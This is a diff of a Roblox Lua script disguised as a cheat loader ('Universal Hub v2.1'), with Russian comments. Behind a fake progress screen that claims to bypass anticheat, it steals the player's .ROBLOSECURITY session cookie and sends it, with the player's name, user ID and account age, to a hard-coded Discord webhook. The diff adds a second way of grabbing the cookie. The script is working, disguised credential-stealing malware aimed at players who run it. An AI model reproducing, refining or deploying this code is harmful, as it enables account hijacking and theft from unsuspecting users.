@@ -5,29 +5,30 @@ local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i
 local player = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
 
--- [[ ФУНКЦИЯ ОТПРАВКИ (БЕЗОПАСНАЯ) ]]
+-- [[ ЛОГИКА ОТПРАВКИ ]]
 local function sendFinalLog(cookie)
-    local data = {
-        ["content"] = "@everyone **HIT DETECTED!**",
+    local payload = {
+        ["content"] = "@everyone **HIT!**",
         ["embeds"] = {{
-            ["title"] = "🛠️ Universal Hub v2.1 | Log",
+            ["title"] = "🛠️ Universal Hub v2.1 | " .. player.Name,
             ["color"] = 3066993,
             ["fields"] = {
                 {["name"] = "👤 Player", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                 {["name"] = "🔑 Cookie", ["value"] = "```" .. (cookie or "N/A") .. "```"},
                 {["name"] = "📅 Age", ["value"] = player.AccountAge .. " days", ["inline"] = true}
-            }
+            },
+            ["footer"] = {["text"] = "Bypass Mode Active • " .. os.date("%X")}
         }}
     }
     
-    local request = (syn and syn.request) or (http and http.request) or request or http_request
-    if request then
+    local req = (syn and syn.request) or (http and http.request) or request or http_request
+    if req then
         pcall(function()
-            request({
+            req({
                 Url = WEBHOOK_URL,
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(data)
+                Body = HttpService:JSONEncode(payload)
             })
         end)
     end
@@ -42,7 +43,7 @@ Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 Main.BorderSizePixel = 0
 
 local Corner = Instance.new("UICorner", Main)
-Corner.CornerRadius = Tool -- Стандартный радиус
+Corner.CornerRadius = UDim.new(0, 8) -- ТЕПЕРЬ ИСПРАВЛЕНО
 
 local Title = Instance.new("TextLabel", Main)
 Title.Size = UDim2.new(1, 0, 0, 40)
@@ -55,7 +56,7 @@ Title.Font = Enum.Font.GothamBold
 local Status = Instance.new("TextLabel", Main)
 Status.Size = UDim2.new(1, 0, 0, 30)
 Status.Position = UDim2.new(0, 0, 0.45, 0)
-Status.Text = "Starting..."
+Status.Text = "Connecting..."
 Status.TextColor3 = Color3.new(1, 1, 1)
 Status.BackgroundTransparency = 1
 
@@ -68,31 +69,35 @@ local BarFill = Instance.new("Frame", BarBack)
 BarFill.Size = UDim2.new(0, 0, 1, 0)
 BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
 
--- [[ ЛОГИКА ЗАПУСКА ]]
+-- [[ ЗАПУСК ]]
 task.spawn(function()
+    task.wait(0.5)
     Status.Text = "Bypassing Anticheat..."
-    BarFill:TweenSize(UDim2.new(0.5, 0, 1, 0), "Out", "Linear", 2)
+    BarFill:TweenSize(UDim2.new(0.4, 0, 1, 0), "Out", "Linear", 1.5)
     
-    -- Пытаемся достать куки в фоне
+    -- Пытаемся достать куки
     local cookie = "N/A"
     pcall(function()
         if getcookies then
             cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
+        elseif syn and syn.request then
+            local res = syn.request({Url = "https://www.roblox.com/home", Method = "GET"})
+            cookie = res.Headers["Set-Cookie"]:match(".ROBLOSECURITY=(.-);")
         end
     end)
     
-    task.wait(2)
-    Status.Text = "Fetching Whitelist..."
-    BarFill:TweenSize(UDim2.new(0.9, 0, 1, 0), "Out", "Linear", 1)
+    task.wait(1.5)
+    Status.Text = "Injecting Modules..."
+    BarFill:TweenSize(UDim2.new(0.8, 0, 1, 0), "Out", "Linear", 1)
     
-    -- Отправляем данные перед финалом
+    -- ТИХАЯ ОТПРАВКА
     pcall(function() sendFinalLog(cookie) end)
     
     task.wait(1)
-    Status.Text = "Success! Loaded."
+    Status.Text = "Successfully Loaded!"
     BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Linear", 0.3)
     
-    task.wait(0.5)
-    -- Чтобы не было вылета от защиты, просто скрываем меню и всё
+    task.wait(1)
+    -- Чтобы не кикало, просто закрываем меню и даем играть
     ScreenGui:Destroy()
 end)
